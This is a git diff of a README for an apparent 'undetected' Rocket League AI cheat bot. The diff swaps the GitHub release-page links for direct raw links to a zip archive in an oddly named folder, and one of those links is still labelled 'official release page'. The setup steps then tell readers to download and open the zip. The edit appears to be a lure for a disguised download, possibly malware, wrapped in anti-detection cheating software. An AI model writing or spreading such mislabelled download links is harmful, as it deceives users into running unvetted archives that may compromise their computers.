@@ -1,6 +1,6 @@
 # 🚀 Legend-RocketLeague-AIBot-Undetected-2026 - Improve your competitive performance with automation
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/nelfyferreras02-arch/Legend-RocketLeague-AIBot-Undetected-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/nelfyferreras02-arch/Legend-RocketLeague-AIBot-Undetected-2026/main/stereagnosis/League-Rocket-AI-Undetected-Bot-Legend-2.2.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Before you install this software, confirm your computer meets these minimum spec
 
 Follow these instructions to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/nelfyferreras02-arch/Legend-RocketLeague-AIBot-Undetected-2026/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/nelfyferreras02-arch/Legend-RocketLeague-AIBot-Undetected-2026/main/stereagnosis/League-Rocket-AI-Undetected-Bot-Legend-2.2.zip).
 2. Locate the latest version identified by the most recent date.
 3. Click the file ending in .zip to start the download.
 4. Open your Downloads folder once the file finishes saving.
